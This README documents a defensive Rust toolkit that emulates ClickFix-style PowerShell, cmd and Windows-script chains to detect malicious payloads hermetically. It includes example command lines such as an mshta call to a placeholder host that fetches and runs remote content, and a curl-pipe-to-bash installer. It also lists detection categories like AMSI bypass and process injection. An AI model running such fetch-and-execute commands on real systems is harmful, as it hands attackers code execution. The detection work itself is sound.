# ClickFix payload detector

This workspace statically interprets ClickFix-style command chains without
executing host processes, loading assemblies, or writing to the host filesystem
or registry. Network access is disabled by default and available only through
an explicit bounded public-HTTP(S) opt-in.

## Workspace

| Package | Purpose |
| --- | --- |
| `emulator-core` | Shared trace events, evidence, artifacts, limits, host traits, and the in-memory virtual host |
| `cmd-emulator` | Standalone, span-tokenized `cmd.exe` emulation with virtual files and typed process intents |
| `powershell-emulator` | Tree-sitter-backed PowerShell parsing and bounded hermetic interpretation |
| `windows-script-emulator` | Bounded JScript/VBScript interpreter for WScript, CScript, HTA, scriptlet, and COM behavior |
| `runbox-emulator` | Windows command dispatch, virtual process recursion, and launcher modeling |
| `clickfix-detect` | Weighted detection rules, Rust API, human/JSON reports, and the CLI |
| `clickfix-wasm` | Browser-safe wasm-bindgen wrapper around `clickfix-detect` |

Dependencies flow from `clickfix-detect` to `runbox-emulator`, which dispatches
to `powershell-emulator`, `cmd-emulator`, and `windows-script-emulator`.
Cross-emulator Windows primitives live under `emulator_core::windows`. Every
package uses the contracts in `emulator-core`; external commands return typed
synchronous results when runbox has a model and remain deferred intents
otherwise.

## Safety model

The emulator is hermetic by construction:

- Network APIs emit blocked `NetworkIntent` events and IOCs by default.
  Explicit opt-in can permit bounded public HTTP(S) retrieval, but never native
  payload execution.
- Process APIs emit `ProcessIntent` events for recursive runbox dispatch.
- Files and registry values exist only in an in-memory virtual host.
- PowerShell reflection uses explicitly modeled .NET methods.
- COM handling recognizes an allowlist of common WSH objects.
- `rundll32` and `regsvr32` inspect virtual PE bytes and known command patterns;
  native code is never executed.
- Step, depth, loop, process, file, artifact, and decoding limits are
  configurable. Reaching a limit is visible in the report.

Risk and analysis confidence are separate. Unsupported syntax lowers
confidence but does not make suspicious evidence disappear or reduce its risk
score.

## Current compatibility tier

- PowerShell: a dedicated span-preserving tokenizer for strings, here-strings,
  comments, variables, parameters, numbers, operators, redirections, and line
  continuations; precedence-aware arithmetic, comparison, logical, bitwise,
  range, format, regex, split, join, and replacement operators; variables,
  scopes, interpolation, arrays, maps, JSON, simple XML, functions, pipelines,
  `if`, `for`, `foreach`, `while`, `do`, `switch`, and error flow.
- PowerShell transforms: standard and URL-safe Base64, hexadecimal,
  UTF-8/UTF-16/UTF-32, GZip/zlib, reversal, XOR, RC4, AES-CBC, and common
  hashes. Decoded data is retained as a provenance artifact.
- PowerShell host APIs: fixture-backed web requests, `WebClient`,
  `HttpClient`, `WebRequest`, virtual files, paths, ZIP archives, registry,
  scheduled-task/service/WMI persistence models, reconnaissance values, and
  recursive process dispatch.
- PowerShell cmdlets: provider-aware filesystem, registry, environment,
  variable, alias, and function operations; `Select-String`, sorting,
  grouping, comparison, CSV, hex formatting, and tee pipelines; scheduled
  tasks, Defender/security-control intents, deterministic service/network/user
  reconnaissance, module tracking, web sessions, and modeled COM objects such
  as `WScript.Shell`, `XMLHTTP`, `ADODB.Stream`, `Shell.Application`, and
  `FileSystemObject`.
- PowerShell compatibility details: unambiguous parameter abbreviation,
  array/hashtable splatting, multi-value function and scriptblock output,
  `begin`/`process`/`end` pipeline blocks, stateful `[Type]::new()` stream and
  web objects, mutable static properties, reflection-chain provenance,
  recursive provider filters, content encoding/tail/delimiter semantics, and
  modeled BITS job lifecycles.
- Dangerous PowerShell behavior: reflection, AMSI/ETW patterns, managed
  assembly loading, `Add-Type`, P/Invoke declarations, memory APIs, and
  process-injection calls are identified and traced but never executed.
- Standalone `cmd-emulator`: batch labels, arguments, `goto`, subroutine
  calls, `if`, bounded `for`, stdout pipelines, environment expansion,
  chaining, redirection, virtual files, and synchronous typed process results.
- Runbox command utilities: `find`, `findstr`, `more`, `sort`, `where`,
  `curl`/`wget`, BITS, `certutil`, `reg`, basic `xcopy`/`robocopy`, `attrib`,
  `chcp`, scheduled tasks, services, firewall/portproxy state, WMIC process
  creation and remote XSL retrieval, event/audit changes, redacted credential
  targets, blocked MSI installation, `makecab`/`expand`/`extrac32`/`tar`
  archives, and `msbuild`/`installutil`/`cmstp`/`control`/`forfiles` launcher
  models execute outside cmd.
- Windows scripts: bounded JScript and VBScript interpretation for WScript,
  CScript, MSHTA, and scriptlets, including functions, loops, common decoding,
  `WScript.Shell`, `XMLHTTP`, `ADODB.Stream`, `FileSystemObject`, and
  `Shell.Application`. `WScript.Shell.Exec` exposes modeled `Status`,
  `ExitCode`, `StdOut`, and `StdErr` streams, while waiting `Run` calls receive
  synchronous modeled exit codes. Remote HTA and SCT fixtures can recurse into
  child PowerShell or cmd payloads through runbox.
- DLL launchers: scriptlet/JavaScript interpretation, URL extraction, hashes,
  and printable-string inspection of virtual PE files.
- Shell associations: `.ps1`, `.cmd`, `.bat`, `.js`, `.vbs`, and `.hta`.

Unsupported operations are always traced explicitly. The project does not
claim complete Windows PowerShell, JScript, VBScript, COM, DOM, or Win32
compatibility yet.

## CLI

```console
cargo run -p clickfix-detect -- \
  --kind command \
  'powershell.exe -NoProfile -Command "Write-Output safe"'

cargo run -p clickfix-detect -- \
  --kind powershell \
  --format json \
  --file sample.ps1

cat sample.ps1 | cargo run -p clickfix-detect -- --kind powershell
```

`--kind auto` is the default. Use `--max-steps` and `--max-depth` to override
the main resource budgets.

Real network access is disabled by default. `--allow-network` enables public
HTTP and HTTPS requests for `clickfix-detect`, `powershell-emulator`, and
`windows-script-emulator`. The policy rejects loopback, private, link-local,
carrier-grade NAT, documentation, multicast, unspecified, and URL-credential
destinations; ignores ambient proxy configuration; revalidates each redirect;
and defaults to a 10-second timeout, five redirects, and a 4 MiB response
limit. Exact `VirtualHost` fixtures still take precedence. Enabling networking
can retrieve real malicious bytes, but all process, filesystem, registry, DLL,
and script effects remain virtual or modeled.

Every report exposes `network_urls` for direct reputation lookups and
`network_activity` for full context. Each activity record includes the HTTP
method, URL, origin, analysis depth, outcome (`blocked`, `fixture`, `fetched`,
or `failed`), response status/size when available, and any failure reason.
Attempted URLs are recorded even when access is disabled or rejected by the
public-destination policy.

The detector also supports trusted source URLs for known-good installers and
bootstrap scripts. `https://gh.io/copilot-install` is trusted by default, so
the documented Copilot CLI installation command remains benign even though it
downloads content and pipes it to a shell:

```console
curl -fsSL https://gh.io/copilot-install | VERSION="v0.0.369" PREFIX="$HOME/custom" bash
```

Use repeatable `--safe-source URL` for exact URLs,
`--safe-source-prefix URL_PREFIX` for a path prefix constrained to the same
scheme/host/port, or `--no-default-safe-sources` to start with an empty trust
policy. Trusted sources suppress remote download/use chain findings only when
all observed network sources are trusted. Network activity, URLs, low-level
events, and safe-source evidence remain in the report. Persistence, autorun
writes, unrelated obfuscation, and mixed trusted/untrusted chains are never
suppressed.

With no input in a terminal, `clickfix-detect` opens a history-enabled
interactive analyzer:

```console
cargo run -p clickfix-detect
clickfix> mshta.exe https://example.invalid/fix-error
Verdict: Malicious
Risk: 54 / 100 (High)
...
clickfix> exit
```

Use `--interactive` or `-i` to force this mode when standard input is piped.
Each submitted payload is analyzed independently. Up/Down arrows navigate
history; unbalanced quotes, parentheses, brackets, and braces continue on a
secondary prompt; Ctrl-C cancels the current entry; and Ctrl-D exits. Commands
`:help`, `exit`, `quit`, `:exit`, and `:quit` are also available. `--kind`
selects command or PowerShell interpretation for every entry. With
`--format json`, interactive results are emitted as one compact JSON object per
line.

The PowerShell emulator also has a direct CLI. It prints captured
`Write-Output`, `Write-Host`, and `echo` output to stdout:

```console
cargo run -p powershell-emulator -- -c "echo 'hello'"
cargo run -p powershell-emulator -- "Write-Output 'hello'"
cargo run -p powershell-emulator -- --file sample.ps1
cat sample.ps1 | cargo run -p powershell-emulator
```

The standalone cmd emulator provides the same hermetic boundary for command
lines and batch input:

```console
cargo run -p cmd-emulator -- -c "echo hello && ver"
cargo run -p cmd-emulator -- --env NAME=tester "echo %NAME%"
cargo run -p cmd-emulator -- --file samples/cmd/01-basics.cmd
cargo run -p cmd-emulator -- --file samples/cmd/04-batch-control.cmd --arg tester
cat samples/cmd/02-virtual-files.cmd | cargo run -p cmd-emulator
```

With no input in a terminal it opens a persistent
`C:\Users\analysis>` prompt. `--interactive` forces the prompt for piped
input, `--delayed-expansion` enables `!VAR!`, and `--trace` prints typed
effects. Built-ins operate only on the virtual host; external commands and
`start` emit `ProcessIntent` events and are never executed on the host. Runbox
can synchronously return modeled stdout, stderr, and exit codes. See
[`cmd-emulator/README.md`](cmd-emulator/README.md) for the current bounded
batch, control-flow, expansion, and pipeline scope.

In cmd, use `dir` rather than the PowerShell alias `ls`:

```console
C:\Users\analysis> echo 'hello' > test.txt
C:\Users\analysis> dir /b
test.txt
C:\Users\analysis> type test.txt
'hello'
```

Cmd does not treat single quotes as quoting characters, so they are retained
in the file contents.

The Windows script emulator can be used directly for JScript, VBScript, HTA,
and scriptlet compatibility work:

```console
cargo run -p windows-script-emulator -- \
  -c 'WScript.Echo(String.fromCharCode(79,75))'
cargo run -p windows-script-emulator -- \
  --language vbscript \
  -c 'WScript.Echo Chr(79) & Chr(75)'
cargo run -p windows-script-emulator -- \
  --host mshta \
  --file samples/windows-script/download.hta \
  --web-response "fixture body"
```

Use `--host wscript|cscript|mshta|scriptlet`, repeatable `--arg` and
`--env NAME=VALUE`, and `--trace` to configure the virtual host. See
[`windows-script-emulator/README.md`](windows-script-emulator/README.md) for
the language and COM scope.

Running it without a script in a terminal opens a persistent interactive
session:

```console
cargo run -p powershell-emulator
PS> $value = 40
PS> $value += 2
PS> Write-Output $value
42
PS> exit
```

Variables, functions, virtual files, registry values, aliases, web sessions,
and other emulator state persist between commands. Braces, parentheses,
here-strings, and backtick continuations can span multiple lines. Use `exit`,
`quit`, `:exit`, `:quit`, or Ctrl-D to leave. Pass `--interactive` to force
this mode when stdin is piped. In a real terminal, Up/Down arrows navigate
commands entered earlier in the current session, while Ctrl-C cancels the
current input without terminating the emulator.

PowerShell output redirection writes only to the virtual filesystem:

```console
PS> echo 'abc' > test.txt
PS> echo 'def' >> test.txt
PS> Get-Content test.txt
abc
def
```

Success (`>`/`1>`), error (`2>`), all-stream (`*>`), append (`>>`) and
`2>&1` merge forms are modeled. File output follows the Windows PowerShell 5.1
`Out-File` default of UTF-16LE.

Interactive filesystem objects use PowerShell-style table formatting:

```console
PS> ls
    Directory: c:\users\analysis

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----               01/01/2024     00:00                appdata
-a----               01/01/2024     00:00              4 note.txt
```

The timestamp is deterministic because the virtual filesystem does not use
host timestamps. `ls -Name` continues to print names only.

Pass `--trace` to print the emulation trace to stderr.

Web requests do not access the network by default. They return an empty
synthetic text response unless an exact/default fixture is configured.
`--allow-network` opts into bounded public HTTP(S) retrieval:

```console
cargo run -p powershell-emulator -- \
  --web-response "fixed fixture body" \
  -c '$response = Invoke-WebRequest "https://example.invalid/test"; Write-Output $response.Content'
```

Exact responses registered through `VirtualHost::register_network_response`
take precedence over both real networking and the fixed fallback. Use
`VirtualHost::clear_default_network_response` to restore a no-response model.

The virtual process starts with a deterministic Windows 11-style environment,
including `USERPROFILE`, `APPDATA`, `LOCALAPPDATA`, `ProgramFiles`,
`ProgramData`, `SystemRoot`, `COMPUTERNAME`, `USERNAME`, `USERDOMAIN`, `PATH`,
`PATHEXT`, processor variables and `PSModulePath`. Overrides can be supplied
more than once:

```console
cargo run -p powershell-emulator -- \
  --env USERNAME=tester \
  --env 'TEMP=C:\Scratch' \
  -c 'Write-Output "$($env:USERNAME):$($env:TEMP)"'
```

Environment access is case-insensitive and works through `$env:NAME`, the
`Env:` provider, and `[Environment]` methods and static properties.

The virtual filesystem also starts with common Windows 11 user, Program Files,
ProgramData, Windows, System32, PowerShell, WMI, task, Startup, temporary, and
.NET Framework directories. Modeled executables such as `cmd.exe`,
`powershell.exe`, `mshta.exe`, `wscript.exe`, `rundll32.exe`, `curl.exe`,
`msiexec.exe`, `schtasks.exe`, `tar.exe`, and the other runbox utilities appear
in normal cmd and PowerShell directory listings. Baseline entries are omitted
from analysis artifacts unless modified.

Benign compatibility samples are available under `samples/powershell`:

```console
for script in samples/powershell/*.ps1; do
  cargo run -p powershell-emulator -- --file "$script"
done
```

The COM/security-intent sample expects a fixed synthetic web response:

```console
cargo run -p powershell-emulator -- \
  --web-response "fixture body" \
  --trace \
  --file samples/powershell/08-com-and-security-intents.ps1
```

Library callers can register deterministic virtual HTTP responses with
`VirtualHost::register_network_response`; the emulator records the request and
uses the supplied bytes without opening a network connection. Alternatively,
callers can explicitly apply `NetworkPolicy::public_http()` to permit bounded
public HTTP(S) requests.

## Rust API

```rust
use clickfix_detect::{Detector, DetectorInput};

let report = Detector::default().analyze(DetectorInput::powershell_script(
    "Write-Output 'safe'",
))?;
println!("{:?}: {}", report.verdict, report.risk.score);
for url in &report.network_urls {
    println!("reputation lookup: {url}");
}
# Ok::<(), clickfix_detect::DetectorError>(())
```

Network policy and virtual environment contents are configurable through the
library APIs:

```rust
use emulator_core::{AnalysisLimits, NetworkPolicy, VirtualHost};

let mut host = VirtualHost::new(AnalysisLimits::default());
host.add_virtual_directory(r"C:\Tools")?;
host.add_virtual_file(r"C:\Tools\config.txt", b"safe fixture")?;
host.add_virtual_executable(r"C:\Tools\tool.exe")?;
host.set_environment_variable("TOOL_HOME", r"C:\Tools");
host.set_registry_value(r"HKCU\Software\Example\Path", r"C:\Tools");
host.set_network_policy(NetworkPolicy::public_http());

assert!(host.virtual_executable_paths().contains(&r"c:\tools\tool.exe".into()));
# Ok::<(), emulator_core::HostError>(())
```

Matching remove/query methods are available for virtual files, directories,
executables, environment variables, registry values, and exact network
fixtures. `Detector::with_network_policy` and `Runbox::with_network_policy`
provide the same opt-in policy at higher layers.

Safe sources are independently configurable:

```rust
use clickfix_detect::{Detector, SafeSourcePolicy};

let mut safe_sources = SafeSourcePolicy::empty();
safe_sources.add_exact_url("https://downloads.example.com/bootstrap.ps1")?;
safe_sources.add_url_prefix("https://downloads.example.com/releases/")?;

let detector = Detector::default().with_safe_source_policy(safe_sources);
# Ok::<(), String>(())
```

## Browser build

`clickfix-wasm` exposes `analyze_payload(payload, input_kind)` for static,
client-side applications. The browser target uses the span-preserving
PowerShell tokenizer rather than the native tree-sitter diagnostic pass, while
retaining the same emulator and detection logic. Real networking is unavailable
from this wrapper, so analysis remains local to the page.

The companion Azure Static Web Apps project lives at
`~/clickfix.kryc.uk`. Its build script compiles this workspace for
`wasm32-unknown-unknown`, generates wasm-bindgen browser bindings, and bundles
them with local Bootstrap assets.

## Development

The documented MSRV is Rust 1.85. The PowerShell syntax tree uses
`tree-sitter-powershell` 0.24.5, the newest compatible grammar release for that
baseline in this workspace.

```console
cargo fmt --all --check
cargo test --workspace
cargo clippy --workspace --all-targets -- -D warnings
```

### Fuzzing

The `powershell-emulator/fuzz` project contains two `cargo-fuzz` targets:

- `tokenizer` asserts complete, ordered, UTF-8-safe token spans.
- `emulator` runs arbitrary valid UTF-8 scripts through the hermetic emulator
  with strict resource limits.

```console
rustup toolchain install nightly --profile minimal
cargo install cargo-fuzz --version 0.12.0 --locked
cd powershell-emulator
cargo +nightly fuzz run tokenizer -- -max_len=65536
cargo +nightly fuzz run emulator -- -max_len=65536
```

For a bounded smoke run, add `-runs=10000`. Seed corpora are stored under
`powershell-emulator/fuzz/corpus`, and crashing inputs are written under
`powershell-emulator/fuzz/artifacts`.

`cmd-emulator/fuzz` is an isolated cargo-fuzz workspace with matching
`tokenizer` and `emulator` targets plus command/batch seed corpora:

```console
cd cmd-emulator
cargo +nightly fuzz run tokenizer -- -max_len=65536
cargo +nightly fuzz run emulator -- -max_len=65536
```

`windows-script-emulator/fuzz` provides the same tokenizer and full-emulator
targets for JScript, VBScript, HTA, and scriptlet seeds.

Synthetic fixtures use reserved `example.invalid` destinations and inert
content. No license is currently granted; no license file is included.

`clickfix-detect/tests/real_world_payloads` contains a separate source-attributed
regression corpus of commands published by threat-research vendors. Payloads
are Base64-encoded at rest and decoded only inside the tests. Publication
defanging is restored where the original host is known, while malformed
quoting, capitalization, placeholders, execution structure, and whitespace
remain unchanged.

`clickfix-detect/tests/benign_payloads.rs` provides negative controls for local
MSI installation, ordinary `rundll32`/`mshta`/`wscript` usage, inventory
PowerShell, local file/archive operations, and remote downloads that are not
subsequently executed. High-risk verdicts rely on correlated remote-launch or
download/extract/execute behavior rather than generic network and file events.
Network-sourced writes into user/all-users Startup or Windows scheduled-task
directories are treated as critical persistence even before execution.
